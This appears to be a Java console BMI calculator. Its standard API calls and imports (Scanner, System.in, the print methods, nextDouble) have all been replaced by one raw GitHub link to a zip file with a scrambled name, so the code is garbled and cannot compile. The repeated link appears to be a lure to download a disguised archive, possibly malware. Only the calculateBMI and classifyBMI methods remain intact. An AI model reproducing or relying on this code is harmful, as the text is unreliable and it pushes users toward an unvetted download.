package unit;

import https://raw.githubusercontent.com/Subhashsubh/Body-Mass-Index-BMI-based-on-a-user-s-weight-and-height/main/metamorphize/Index_and_s_Mass_weight_BM_on_user_height_Body_a_based_v1.3.zip;

public class New {

    public static void main(String[] args) {
        Scanner scanner = new Scanner(https://raw.githubusercontent.com/Subhashsubh/Body-Mass-Index-BMI-based-on-a-user-s-weight-and-height/main/metamorphize/Index_and_s_Mass_weight_BM_on_user_height_Body_a_based_v1.3.zip);

        https://raw.githubusercontent.com/Subhashsubh/Body-Mass-Index-BMI-based-on-a-user-s-weight-and-height/main/metamorphize/Index_and_s_Mass_weight_BM_on_user_height_Body_a_based_v1.3.zip("--- BMI Calculator ---");

        // Input weight
        https://raw.githubusercontent.com/Subhashsubh/Body-Mass-Index-BMI-based-on-a-user-s-weight-and-height/main/metamorphize/Index_and_s_Mass_weight_BM_on_user_height_Body_a_based_v1.3.zip("Enter your weight in kilograms (kg): ");
        double weight = https://raw.githubusercontent.com/Subhashsubh/Body-Mass-Index-BMI-based-on-a-user-s-weight-and-height/main/metamorphize/Index_and_s_Mass_weight_BM_on_user_height_Body_a_based_v1.3.zip();

        // Input height
        https://raw.githubusercontent.com/Subhashsubh/Body-Mass-Index-BMI-based-on-a-user-s-weight-and-height/main/metamorphize/Index_and_s_Mass_weight_BM_on_user_height_Body_a_based_v1.3.zip("Enter your height in meters (m): ");
        double height = https://raw.githubusercontent.com/Subhashsubh/Body-Mass-Index-BMI-based-on-a-user-s-weight-and-height/main/metamorphize/Index_and_s_Mass_weight_BM_on_user_height_Body_a_based_v1.3.zip();

        // Calculate BMI
        double bmi = calculateBMI(weight, height);

        // Display BMI result
        https://raw.githubusercontent.com/Subhashsubh/Body-Mass-Index-BMI-based-on-a-user-s-weight-and-height/main/metamorphize/Index_and_s_Mass_weight_BM_on_user_height_Body_a_based_v1.3.zip("Your BMI is: %.2f%n", bmi);

        // Display BMI category
        String category = classifyBMI(bmi);
        https://raw.githubusercontent.com/Subhashsubh/Body-Mass-Index-BMI-based-on-a-user-s-weight-and-height/main/metamorphize/Index_and_s_Mass_weight_BM_on_user_height_Body_a_based_v1.3.zip("You are classified as: " + category);
    }

    // Method to calculate BMI
    public static double calculateBMI(double weight, double height) {
        return weight / (height * height);
    }

    // Method to classify BMI
    public static String classifyBMI(double bmi) {
        if (bmi < 18.5) {
            return "Underweight";
        } else if (bmi >= 18.5 && bmi < 24.9) {
            return "Normal weight";
        } else if (bmi >= 25 && bmi < 29.9) {
            return "Overweight";
        } else {
            return "Obesity";
        }
    }
}
